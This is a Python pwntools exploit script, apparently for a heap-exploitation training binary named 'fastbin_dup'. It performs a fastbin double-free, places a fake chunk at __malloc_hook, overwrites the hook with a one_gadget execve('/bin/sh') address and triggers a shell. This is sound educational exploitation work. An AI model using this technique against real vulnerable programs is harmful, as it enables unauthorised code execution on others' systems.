#!/usr/bin/python3
from pwn import *

elf = context.binary = ELF("fastbin_dup")
libc = elf.libc

gs = '''
continue
'''
def start():
    if args.GDB:
        return gdb.debug(elf.path, gdbscript=gs)
    else:
        return process(elf.path)

# Index of allocated chunks.
index = 0

# Select the "malloc" option; send size & data.
# Returns chunk index.
def malloc(size, data):
    global index
    io.send(b"1")
    io.sendafter(b"size: ", f"{size}")
    io.sendafter(b"data: ", data)
    io.recvuntil(b"> ")
    index += 1
    return index - 1

# Select the "free" option; send index.
def free(index):
    io.send(b"2")
    io.sendafter(b"index: ", f"{index}")
    io.recvuntil(b"> ")

io = start()

# This binary leaks the address of puts(), use it to resolve the libc load address.
io.recvuntil(b"puts() @ ")
libc.address = int(io.recvline(), 16) - libc.sym["puts"]
io.timeout = 0.1

# =============================================================================

# Set the username field.
username = b"A"*8
io.sendafter(b"username: ", username)
io.recvuntil(b"> ")

# Request two 0x70-sized chunks and fill them with data.
chunk_A = malloc(0x68, "A"*0x68)
chunk_B = malloc(0x68, "B"*0x68)

# Free the first chunk, then the second.
free(chunk_A)
free(chunk_B)
free(chunk_A)

# fake chunk
chunk_C = malloc(0x68, p64(libc.sym["__malloc_hook"] - 0x23)) #overwrite fd ptr
chunk_D = malloc(0x68, "A"*16)
chunk_E = malloc(0x68, "B"*16)
'''
0x45226 execve("/bin/sh", rsp+0x30, environ)
constraints:
  rax == NULL

0x4527a execve("/bin/sh", rsp+0x30, environ)
constraints:
  [rsp+0x30] == NULL

0xf03a4 execve("/bin/sh", rsp+0x50, environ)
constraints:
  [rsp+0x50] == NULL

0xf1247 execve("/bin/sh", rsp+0x70, environ)
constraints:
  [rsp+0x70] == NULL
'''

# Overwrite malloc hook, with one gadget
BINSH = libc.search(b"/bin/sh\x00").__next__()
ONE_GADGET = 0xf03a4 + libc.address
malloc(0x68, b"Z"*0x13 + p64(ONE_GADGET))

# Call one gadget
malloc(0x1, b"a")
# =============================================================================

io.interactive()